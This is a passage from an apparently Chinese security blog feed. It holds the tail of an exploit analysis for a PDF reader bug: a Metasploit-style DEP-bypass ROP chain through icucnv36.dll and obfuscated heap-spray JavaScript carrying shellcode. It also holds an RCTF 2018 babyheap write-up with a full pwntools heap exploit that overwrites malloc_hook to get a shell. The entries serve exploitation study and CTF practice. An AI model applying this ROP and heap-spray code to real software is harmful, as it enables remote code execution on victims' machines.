class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_js</span><span class="params">(encoded_payload)</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The following executes a ret2lib using icucnv36.dll</span></span><br><span class="line"><span class="comment"># The effect is to bypass DEP and execute the shellcode in an indirect way</span></span><br><span class="line">stack_data = [</span><br><span class="line"><span class="number">0x41414141</span>,   <span class="comment"># unused</span></span><br><span class="line"><span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line"><span class="number">0x4a8a0000</span>,   <span class="comment"># becomes ecx</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x4a802196</span>,   <span class="comment"># mov [ecx],eax / ret # save whatever eax starts as</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x4a801f90</span>,   <span class="comment"># pop eax / ret</span></span><br><span class="line"><span class="number">0x4a84903c</span>,   <span class="comment"># becomes eax (import for CreateFileA)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -- call CreateFileA</span></span><br><span class="line"><span class="number">0x4a80b692</span>,   <span class="comment"># jmp [eax]</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x4a801064</span>,   <span class="comment"># ret</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x4a8522c8</span>,   <span class="comment"># first arg to CreateFileA (lpFileName / pointer to "iso88591")</span></span><br><span class="line"><span class="number">0x10000000</span>,   <span class="comment"># second arg  - dwDesiredAccess</span></span><br><span class="line"><span class="number">0x00000000</span>,   <span class="comment"># third arg   - dwShareMode</span></span><br><span class="line"><span class="number">0x00000000</span>,   <span class="comment"># fourth arg  - lpSecurityAttributes</span></span><br><span class="line"><span class="number">0x00000002</span>,   <span class="comment"># fifth arg   - dwCreationDisposition</span></span><br><span class="line"><span class="number">0x00000102</span>,   <span class="comment"># sixth arg   - dwFlagsAndAttributes</span></span><br><span class="line"><span class="number">0x00000000</span>,   <span class="comment"># seventh arg - hTemplateFile</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line"><span class="number">0x4a801064</span>,   <span class="comment"># becomes ecx</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x4a842db2</span>,   <span class="comment"># xchg eax,edi / ret</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x4a802ab1</span>,   <span class="comment"># pop ebx / ret</span></span><br><span class="line"><span class="number">0x00000008</span>,   <span class="comment"># becomes ebx - offset to modify</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This points at a neat-o block of code that ... TBD</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#   and [esp+ebx*2],edi</span></span><br><span class="line"><span class="comment">#   jne check_slash</span></span><br><span class="line"><span class="comment"># ret_one:</span></span><br><span class="line"><span class="comment">#   mov al,1</span></span><br><span class="line"><span class="comment">#   ret</span></span><br><span class="line"><span class="comment"># check_slash:</span></span><br><span class="line"><span class="comment">#   cmp al,0x2f</span></span><br><span class="line"><span class="comment">#   je ret_one</span></span><br><span class="line"><span class="comment">#   cmp al,0x41</span></span><br><span class="line"><span class="comment">#   jl check_lower</span></span><br><span class="line"><span class="comment">#   cmp al,0x5a</span></span><br><span class="line"><span class="comment">#   jle check_ptr</span></span><br><span class="line"><span class="comment"># check_lower:</span></span><br><span class="line"><span class="comment">#   cmp al,0x61</span></span><br><span class="line"><span class="comment">#   jl ret_zero</span></span><br><span class="line"><span class="comment">#   cmp al,0x7a</span></span><br><span class="line"><span class="comment">#   jg ret_zero</span></span><br><span class="line"><span class="comment">#   cmp [ecx+1],0x3a</span></span><br><span class="line"><span class="comment">#   je ret_one</span></span><br><span class="line"><span class="comment"># ret_zero:</span></span><br><span class="line"><span class="comment">#   xor al,al</span></span><br><span class="line"><span class="comment">#   ret</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x4a80a8a6</span>,   <span class="comment"># execute fun block</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x4a801f90</span>,   <span class="comment"># pop eax / ret</span></span><br><span class="line"><span class="number">0x4a849038</span>,   <span class="comment"># becomes eax (import for CreateFileMappingA)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -- call CreateFileMappingA</span></span><br><span class="line"><span class="number">0x4a80b692</span>,   <span class="comment"># jmp [eax]</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x4a801064</span>,   <span class="comment"># ret</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xffffffff</span>,   <span class="comment"># arguments to CreateFileMappingA, hFile</span></span><br><span class="line"><span class="number">0x00000000</span>,   <span class="comment"># lpAttributes</span></span><br><span class="line"><span class="number">0x00000040</span>,   <span class="comment"># flProtect</span></span><br><span class="line"><span class="number">0x00000000</span>,   <span class="comment"># dwMaximumSizeHigh</span></span><br><span class="line"><span class="number">0x00010000</span>,   <span class="comment"># dwMaximumSizeLow</span></span><br><span class="line"><span class="number">0x00000000</span>,   <span class="comment"># lpName</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line"><span class="number">0x4a801064</span>,   <span class="comment"># becomes ecx</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x4a842db2</span>,   <span class="comment"># xchg eax,edi / ret</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x4a802ab1</span>,   <span class="comment"># pop ebx / ret</span></span><br><span class="line"><span class="number">0x00000008</span>,   <span class="comment"># becomes ebx - offset to modify</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x4a80a8a6</span>,   <span class="comment"># execute fun block</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x4a801f90</span>,   <span class="comment"># pop eax / ret</span></span><br><span class="line"><span class="number">0x4a849030</span>,   <span class="comment"># becomes eax (import for MapViewOfFile</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -- call MapViewOfFile</span></span><br><span class="line"><span class="number">0x4a80b692</span>,   <span class="comment"># jmp [eax]</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x4a801064</span>,   <span class="comment"># ret</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xffffffff</span>,   <span class="comment"># args to MapViewOfFile - hFileMappingObject</span></span><br><span class="line"><span class="number">0x00000022</span>,   <span class="comment"># dwDesiredAccess</span></span><br><span class="line"><span class="number">0x00000000</span>,   <span class="comment"># dwFileOffsetHigh</span></span><br><span class="line"><span class="number">0x00000000</span>,   <span class="comment"># dwFileOffsetLow</span></span><br><span class="line"><span class="number">0x00010000</span>,   <span class="comment"># dwNumberOfBytesToMap</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line"><span class="number">0x4a8a0004</span>,   <span class="comment"># becomes ecx - writable pointer</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x4a802196</span>,   <span class="comment"># mov [ecx],eax / ret - save map base addr</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line"><span class="number">0x4a801064</span>,   <span class="comment"># becomes ecx - ptr to ret</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x4a842db2</span>,   <span class="comment"># xchg eax,edi / ret</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x4a802ab1</span>,   <span class="comment"># pop ebx / ret</span></span><br><span class="line"><span class="number">0x00000030</span>,   <span class="comment"># becomes ebx - offset to modify</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x4a80a8a6</span>,   <span class="comment"># execute fun block</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x4a801f90</span>,   <span class="comment"># pop eax / ret</span></span><br><span class="line"><span class="number">0x4a8a0004</span>,   <span class="comment"># becomes eax - saved file mapping ptr</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x4a80a7d8</span>,   <span class="comment"># mov eax,[eax] / ret - load saved mapping ptr</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line"><span class="number">0x4a801064</span>,   <span class="comment"># becomes ecx - ptr to ret</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x4a842db2</span>,   <span class="comment"># xchg eax,edi / ret</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x4a802ab1</span>,   <span class="comment"># pop ebx / ret</span></span><br><span class="line"><span class="number">0x00000020</span>,   <span class="comment"># becomes ebx - offset to modify</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x4a80a8a6</span>,   <span class="comment"># execute fun block</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line"><span class="number">0x4a801064</span>,   <span class="comment"># becomes ecx - ptr to ret</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x4a80aedc</span>,   <span class="comment"># lea edx,[esp+0xc] / push edx / push eax / push [esp+0xc] / push [0x4a8a093c] / call ecx / add esp, 0x10 / ret</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x4a801f90</span>,   <span class="comment"># pop eax / ret</span></span><br><span class="line"><span class="number">0x00000034</span>,   <span class="comment"># becomes eax</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x4a80d585</span>,   <span class="comment"># add eax,edx / ret</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line"><span class="number">0x4a801064</span>,   <span class="comment"># becomes ecx - ptr to ret</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x4a842db2</span>,   <span class="comment"># xchg eax,edi / ret</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x4a802ab1</span>,   <span class="comment"># pop ebx / ret</span></span><br><span class="line"><span class="number">0x0000000a</span>,   <span class="comment"># becomes ebx - offset to modify</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x4a80a8a6</span>,   <span class="comment"># execute fun block</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x4a801f90</span>,   <span class="comment"># pop eax / ret</span></span><br><span class="line"><span class="number">0x4a849170</span>,   <span class="comment"># becomes eax (import for memcpy)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -- call memcpy</span></span><br><span class="line"><span class="number">0x4a80b692</span>,   <span class="comment"># jmp [eax]</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xffffffff</span>,   <span class="comment"># this stuff gets overwritten by the block at 0x4a80aedc, becomes ret from memcpy</span></span><br><span class="line"><span class="number">0xffffffff</span>,   <span class="comment"># becomes first arg to memcpy (dst)</span></span><br><span class="line"><span class="number">0xffffffff</span>,   <span class="comment"># becomes second arg to memcpy (src)</span></span><br><span class="line"><span class="number">0x00001000</span>,   <span class="comment"># becomes third arg to memcpy (length)</span></span><br><span class="line"><span class="comment">#0x0000258b,   # ??</span></span><br><span class="line"><span class="comment">#0x4d4d4a8a,   # ??</span></span><br><span class="line">].pack(<span class="string">'V*'</span>)</span><br><span class="line"></span><br><span class="line">var_unescape  = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line">var_shellcode = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">var_start     = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">var_s         = <span class="number">0x10000</span></span><br><span class="line">var_c         = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line">var_b         = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line">var_d         = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line">var_3         = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line">var_i         = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line">var_4         = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload_buf = <span class="string">''</span></span><br><span class="line">payload_buf &lt;&lt; stack_data</span><br><span class="line">payload_buf &lt;&lt; encoded_payload</span><br><span class="line"></span><br><span class="line">escaped_payload = Rex::Text.to_unescape(payload_buf)</span><br><span class="line"></span><br><span class="line">js = <span class="string">%Q|</span></span><br><span class="line"><span class="string">var <span class="subst">#&#123;var_unescape&#125;</span> = unescape;</span></span><br><span class="line"><span class="string">var <span class="subst">#&#123;var_shellcode&#125;</span> = <span class="subst">#&#123;var_unescape&#125;</span>( '<span class="subst">#&#123;escaped_payload&#125;</span>' );</span></span><br><span class="line"><span class="string">var <span class="subst">#&#123;var_c&#125;</span> = <span class="subst">#&#123;var_unescape&#125;</span>( "%" + "u" + "0" + "c" + "0" + "c" + "%u" + "0" + "c" + "0" + "c" );</span></span><br><span class="line"><span class="string">while (<span class="subst">#&#123;var_c&#125;</span>.length + 20 + 8 &lt; <span class="subst">#&#123;var_s&#125;</span>) <span class="subst">#&#123;var_c&#125;</span>+=<span class="subst">#&#123;var_c&#125;</span>;</span></span><br><span class="line"><span class="string"><span class="subst">#&#123;var_b&#125;</span> = <span class="subst">#&#123;var_c&#125;</span>.substring(0, (0x0c0c-0x24)/2);</span></span><br><span class="line"><span class="string"><span class="subst">#&#123;var_b&#125;</span> += <span class="subst">#&#123;var_shellcode&#125;</span>;</span></span><br><span class="line"><span class="string"><span class="subst">#&#123;var_b&#125;</span> += <span class="subst">#&#123;var_c&#125;</span>;</span></span><br><span class="line"><span class="string"><span class="subst">#&#123;var_d&#125;</span> = <span class="subst">#&#123;var_b&#125;</span>.substring(0, <span class="subst">#&#123;var_s&#125;</span>/2);</span></span><br><span class="line"><span class="string">while(<span class="subst">#&#123;var_d&#125;</span>.length &lt; 0x80000) <span class="subst">#&#123;var_d&#125;</span> += <span class="subst">#&#123;var_d&#125;</span>;</span></span><br><span class="line"><span class="string"><span class="subst">#&#123;var_3&#125;</span> = <span class="subst">#&#123;var_d&#125;</span>.substring(0, 0x80000 - (0x1020-0x08) / 2);</span></span><br><span class="line"><span class="string">var <span class="subst">#&#123;var_4&#125;</span> = new Array();</span></span><br><span class="line"><span class="string">for (<span class="subst">#&#123;var_i&#125;</span>=0;<span class="subst">#&#123;var_i&#125;</span>&lt;0x1f0;<span class="subst">#&#123;var_i&#125;</span>++) <span class="subst">#&#123;var_4&#125;</span>[<span class="subst">#&#123;var_i&#125;</span>]=<span class="subst">#&#123;var_3&#125;</span>+"s";</span></span><br><span class="line"><span class="string">|</span></span><br><span class="line"></span><br><span class="line">js</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><p>就是和上一步的调试的结果差不多，就是布置 <code>shellcode</code>，堆喷射之类的，<code>and [esp+ebx*2],edi</code> 感觉这个指令用的好6。大概就是这些了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;从备份失败的老博客还原出来的&lt;br&gt;
    
    </summary>
    
    
      <category term="old_blog" scheme="https://vsane.github.io/tags/old-blog/"/>
    
      <category term="vuln" scheme="https://vsane.github.io/tags/vuln/"/>
    
  </entry>
  
  <entry>
    <title>rctf 2018 babyheap</title>
    <link href="https://vsane.github.io/2019/01/09/rctf-2018/"/>
    <id>https://vsane.github.io/2019/01/09/rctf-2018/</id>
    <published>2019-01-09T07:20:22.000Z</published>
    <updated>2019-01-09T09:24:51.028Z</updated>
    
    <content type="html"><![CDATA[<p>从备份失败的老博客还原出来的<br><a id="more"></a></p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>函数在读入数据的时候存在 <code>null off by one</code><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a2; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  buf = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( read(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>LL) &lt; <span class="number">0</span> )</span><br><span class="line">    fprintf_error((__int64)<span class="string">"read() error"</span>);</span><br><span class="line">  *(_BYTE *)(a1 + i) = buf;</span><br><span class="line">  <span class="keyword">if</span> ( buf == <span class="number">10</span> )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">*(_BYTE *)(i + a1) = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br></pre></td></tr></table></figure></p><h3 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h3><p>如下图构造堆，<code>free</code> 堆 <code>1</code> 和 <code>3</code>, 之后重新分配 <code>3</code> ,并且使 <code>chunk 4</code>的 <code>prev size</code> 位为前三个<code>chunk</code> 的大小的和， <code>null off by one</code> 使<br>覆盖<code>chunk 4</code>的<code>inuse</code>位，造成<code>chunkoverlapping</code>,泄漏<code>libc</code>基址，之后使用 <code>fastbin double free</code>使得 <code>malloc_hook</code>被赋值为 <code>one_gadget</code>的地址，发现做完后最坑的是四个 <code>gadget</code>没有一个符合上下文，懵逼，最后师傅告诉我可以通过瞎 <code>free</code>,然后导致<code>abort</code>,最后<code>getshell</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+-----------+</span><br><span class="line">|     1     |  small bin 128</span><br><span class="line">+-----------+</span><br><span class="line">|     2     |  fastbin  96</span><br><span class="line">+-----------+</span><br><span class="line">|     3     |  fastbin 96</span><br><span class="line">+-----------+</span><br><span class="line">|     4     | smallbin 240</span><br><span class="line">+-----------+</span><br></pre></td></tr></table></figure></p><p>下面是利用程序<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(p, size, content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"size: "</span>)</span><br><span class="line">p.sendline(size)</span><br><span class="line">p.recvuntil(<span class="string">"content: "</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(p, index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"index: "</span>)</span><br><span class="line">p.sendline(index)</span><br><span class="line"><span class="keyword">return</span> p.recv()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(p, index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"index: "</span>)</span><br><span class="line">p.sendline(index)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(p)</span>:</span></span><br><span class="line">alloc(p, <span class="string">'128'</span>, <span class="string">'A'</span>) <span class="comment">#0</span></span><br><span class="line">alloc(p, <span class="string">'96'</span>, <span class="string">'A'</span>) <span class="comment">#1</span></span><br><span class="line">alloc(p, <span class="string">'96'</span>, <span class="string">'B'</span>) <span class="comment">#2</span></span><br><span class="line">alloc(p, <span class="string">'240'</span>, <span class="string">'C'</span>) <span class="comment">#3</span></span><br><span class="line">alloc(p, <span class="string">'32'</span>, <span class="string">'C'</span>) <span class="comment">#4</span></span><br><span class="line">delete(p, <span class="string">'0'</span>) <span class="comment">#-0</span></span><br><span class="line">delete(p, <span class="string">'2'</span>) <span class="comment">#-2</span></span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">0x60</span> + p64(<span class="number">0x170</span>)</span><br><span class="line">alloc(p, <span class="string">'104'</span>, payload) <span class="comment">#0</span></span><br><span class="line">delete(p, <span class="string">'3'</span>) <span class="comment">#-3</span></span><br><span class="line">alloc(p, <span class="string">'128'</span>, <span class="string">'A'</span>*<span class="number">0x80</span>) <span class="comment">#2</span></span><br><span class="line">data = show(p, <span class="string">'1'</span>)</span><br><span class="line">unsort_bin_addr = u64(data.split(<span class="string">": "</span>)[<span class="number">1</span>][:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">top_chunk = unsort_bin_addr </span><br><span class="line">libc_base = unsort_bin_addr - <span class="number">0x3c4b78</span></span><br><span class="line">malloc_hook = libc_base + <span class="number">0x3c4b10</span> </span><br><span class="line">log.info(<span class="string">"top chunk addr 0x%0x"</span>, top_chunk)</span><br><span class="line">one_gadget = libc_base + <span class="number">0xf02a4</span></span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"index: "</span>)</span><br><span class="line">p.sendline(<span class="string">"0"</span>)</span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">0x60</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) +p64(malloc_hook - <span class="number">0x13</span>)</span><br><span class="line">alloc(p, <span class="string">'128'</span>, payload)</span><br><span class="line">alloc(p, <span class="string">'96'</span>, <span class="string">'A'</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">alloc(p, <span class="string">'96'</span>, <span class="string">"A"</span>*<span class="number">3</span> + p64(one_gadget))</span><br><span class="line">delete(p, <span class="string">'1'</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">p = remote(<span class="string">"babyheap.2018.teamrois.cn"</span>, <span class="number">3154</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = process(<span class="string">'./babyheap'</span>)</span><br><span class="line">exploit(p)</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;从备份失败的老博客还原出来的&lt;br&gt;
    
    </summary>
    
    
      <category term="old_blog" scheme="https://vsane.github.io/tags/old-blog/"/>
    
      <category term="ctf" scheme="https://vsane.github.io/tags/ctf/"/>
    
      <category term="pwn" scheme="https://vsane.github.io/tags/pwn/"/>
    
  </entry>
  
</feed>
